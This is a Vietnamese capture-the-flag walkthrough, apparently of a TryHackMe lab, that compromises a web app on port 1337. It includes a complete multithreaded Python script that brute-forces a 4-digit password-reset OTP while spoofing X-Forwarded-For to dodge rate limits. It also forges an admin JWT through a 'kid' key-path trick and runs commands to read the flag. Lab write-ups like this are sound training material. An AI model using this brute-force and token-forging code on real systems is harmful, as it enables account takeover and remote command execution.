Sử dụng Nmap với lệnh sau, tôi phát hiện ra rằng chỉ có hai cổng được mở:
`nmap -Pn -sS -sV -Pn -p- 10.201.104.171`

<img width="686" height="137" alt="image" src="https://github.com/user-attachments/assets/aede24f2-1fb1-4ca4-89fe-b4bab9e86f0f" />

Một ứng dụng web đang chạy trên cổng 1337.
`http://10.201.104.171:1337/`

<img width="786" height="359" alt="image" src="https://github.com/user-attachments/assets/007dce30-5b5b-40bb-8ce2-ff0a81ae8aed" />

Trong quá trình kiểm tra mã nguồn trang, tôi đã phát hiện ra một thông điệp thú vị. 

<img width="653" height="147" alt="image" src="https://github.com/user-attachments/assets/296d5a5a-f95c-47bf-88f4-7dc4ed6bf077" />

Rõ ràng là tiền tố thư mục là 'hmr', vì vậy chúng ta có thể thử tìm đường dẫn đầy đủ bằng công cụ ffuf. 
`ffuf -u http://10.201.104.171:1337/hmr_FUZZ -w /usr/share/wordlists/dirb/common.txt `

<img width="734" height="472" alt="image" src="https://github.com/user-attachments/assets/e3ec77ba-5a5c-4295-bc01-8a78fabb10ad" />

Đã tìm thấy bốn thư mục, bao gồm 'hmr_logs', thư mục này lại chứa một thư mục con có tên là 'error_logs'. 

<img width="668" height="223" alt="image" src="https://github.com/user-attachments/assets/418525b6-3795-459c-bda5-5d2b59c824c0" />

`http://10.201.104.171:1337/hmr_logs/ `

<img width="786" height="107" alt="image" src="https://github.com/user-attachments/assets/0a3b50cc-1737-45c1-93b9-7942a5e629d0" />

Tiếp theo, chúng ta có thể nhập địa chỉ email vào ô "Quên mật khẩu". Sau khi gửi, trang web sẽ yêu cầu xác minh bằng mã OTP và chỉ cho chúng ta 180 giây để nhập mã OTP.

<img width="737" height="326" alt="image" src="https://github.com/user-attachments/assets/a5a7ae03-9414-4d43-bf81-968ddd3688d2" />

Đến bước này, tôi đã sử dụng một đoạn mã Python để bỏ qua mã OTP 4 chữ số và thiết lập mật khẩu mà tôi đã chọn (Password123). Sau đó, tôi đã có thể đăng nhập vào tài khoản. 

```
import requests
import random
import threading
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

url = "http://10.201.104.171:1337/reset_password.php"
num_threads = 50
stop_flag = threading.Event()

# Retry mechanism
retry_strategy = Retry(
    total=5,
    backoff_factor=1,
    status_forcelist=[500, 502, 503, 504],
    raise_on_status=False
)

adapter = HTTPAdapter(max_retries=retry_strategy)
session = requests.Session()
session.mount("http://", adapter)

def brute_force_code(start, end):
    for code in range(start, end):
        code_str = f"{code:04d}"
        try:
            r = session.post(
                url,
                data={"recovery_code": code_str, "s": "180"},
                headers={
                    "X-Forwarded-For": f"127.0.{random.randint(0, 255)}.{random.randint(0, 255)}"
                },
                timeout=10,
                allow_redirects=False,
            )
            if stop_flag.is_set():
                return
            elif r.status_code == 302:
                stop_flag.set()
                print("[-] Timeout reached. Try again.")
                return
            elif "Invalid or expired recovery code!" not in r.text:
                stop_flag.set()
                print(f"[+] Found the recovery code: {code_str}")
                print("[+] Sending the new password request.")
                new_password = "Password123"
                session.post(
                    url,
                    data={
                        "new_password": new_password,
                        "confirm_password": new_password,
                    },
                    headers={
                        "X-Forwarded-For": f"127.0.{random.randint(0, 255)}.{random.randint(0, 255)}"
                    },
                )
                print(f"[+] Password is set to {new_password}")
                return
        except requests.exceptions.RequestException as e:
            print(f"Error: {e}")
            continue

def main():
    print("[+] Sending the password reset request.")
    session.post(url, data={"email": "tester@hammer.thm"})
    print("[+] Starting the code brute-force.")
    code_range = 10000
    step = code_range // num_threads
    threads = []
    for i in range(num_threads):
        start = i * step
        end = start + step
        thread = threading.Thread(target=brute_force_code, args=(start, end))
        threads.append(thread)
        thread.start()
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
```

`python3 brup-force.py `

<img width="468" height="139" alt="image" src="https://github.com/user-attachments/assets/fb7bca45-702a-4eb7-b04d-e2de77a34952" />

Mật khẩu đã được đổi thành Password123 

<img width="786" height="286" alt="image" src="https://github.com/user-attachments/assets/b4e4c0e1-79ec-463d-9bc3-7376553abbd8" />

Trong ứng dụng có một ô tìm kiếm, và khi tôi thử lệnh “ls”, nó hiển thị nhiều tập tin. 

<img width="630" height="603" alt="image" src="https://github.com/user-attachments/assets/a001b1a3-5c73-4e8d-a95c-54ed8fff73a8" />

tìm kiếm đường dẫn → `http://10.201.104.171:1337/188ade1.key ​`
Sau đó tôi đã tải xuống `188ade1.key` tập tin. Khi tôi mở nó ra, tôi đã tìm thấy đoạn mã

<img width="325" height="191" alt="image" src="https://github.com/user-attachments/assets/f53e96d1-e540-4f76-b95c-85f9ec6463d7" />

Tiếp theo, mở Burp Suite và gửi yêu cầu → chọn tùy chọn gửi đến bộ lặp. 

<img width="786" height="522" alt="image" src="https://github.com/user-attachments/assets/d574c4c0-c58b-451c-ab0b-60a7768c0a63" />

persistentSession=no (thay đổi thành yes)

<img width="391" height="533" alt="image" src="https://github.com/user-attachments/assets/cfc19ca9-bbd4-4393-8d27-000254170e4b" />

Sử dụng jwt.io, tôi đã giải mã mã thông báo JWT được tìm thấy trong mã nguồn trang. Việc giải mã mã thông báo cho thấy vị trí khóa là /var/www/mykey.key và cũng có một phần role trong payload.

<img width="786" height="434" alt="image" src="https://github.com/user-attachments/assets/526830b6-1bbe-4d28-97c9-68b642e5d1c7" />

Thay đổi cài đặt 3 “kid”: “/var/www/html/188ade1.key” “role”: “admin” 56058354efb3daa97ebab00fabd7a7d7 

<img width="786" height="497" alt="image" src="https://github.com/user-attachments/assets/3257a7cb-63f7-4901-8f5b-ae36fd6cb38a" />

Sau đó sao chép mã token đã mã hóa, dán vào Burp Suite, chạy lệnh {“command”:”id”} 

<img width="395" height="268" alt="image" src="https://github.com/user-attachments/assets/505b3396-9188-40ab-8bc4-cf99693de8dc" />

Vị trí của lá cờ đã được cung cấp. Vì vậy, hãy chạy → `cat /home/ubuntu/flag.txt`

<img width="786" height="528" alt="image" src="https://github.com/user-attachments/assets/ad6ed3ad-1736-406c-9747-bc5c67b46cd6" />





